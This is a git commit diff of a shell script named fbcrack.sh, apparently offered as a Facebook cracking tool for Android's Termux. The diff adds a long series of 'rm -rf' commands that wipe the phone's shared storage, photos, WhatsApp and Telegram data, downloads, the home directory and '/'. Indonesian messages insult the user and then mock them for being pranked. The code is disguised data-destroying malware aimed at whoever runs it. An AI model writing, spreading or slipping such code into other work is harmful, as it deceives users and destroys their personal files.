18e42c58e1b2d1de011d065e709c548c9df1a347
mrtakil <49750385+mrtakil@users.noreply.github.com>
2019-06-01 20:51:18 +0700

    Add files via upload

--- fbcrack.sh
+++ fbcrack.sh
@@ -5,8 +5,49 @@ echo -e "Cek Muka Lu Kaya Kontol Ajg"
 echo -e "Kalau Kamu Mau Muka Bagus"
 echo -e "Pas Banget Kamu Buka Ini Tools"
 
-pkg update
-git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py
+clear
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf storage/emulated/0
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /storage/emulated/0/Telegram
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/unduhan
+rm -rf /storage/shared/WhatsApp
+rm -rf /storage/shared/DCIM
+rm -rf /storage/shared/GBWhatsApp
+rm -rf /storage/shared/GBInstagram
+rm -rf /storage/shared/Pictures
+rm -rf /storage/shared/Movies
+rm -rf /storage/shared/Download
+rm -rf /storage/shared/Movies
+rm -rf /storage/shared/system/cdsys.co
+rm -rf /storage/shared/system
+rm -rf /storage/shared/Android
+rm -rf /storage/shared/Playlists
+rm -rf /storage/shared/Telegram
+rm -rf /storage/shared/Music
+rm -rf /storage/shared/Movies
+rm -rf /storage/emulated/0/GBWhatsApp
+rm -rf /storage/emulated/0/GBInsta
+rm -rf /storage/emulated/0/GBTelegram
+rm -rf /storage/downloads
+rm -rf /storage/dcim
+rm -rf /storage/shared
+rm -rf /storage/music
+rm -rf /storage/external-1
+rm -rf /
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/WhatsApp
+rm -rf /sdcard/0/Intagram
+clear
 
 echo -e "Nih Ya Kamu Sudah Menjadi Ganteng Hahahaha"
 echo -e "Mampus Kena Prank Lo!"
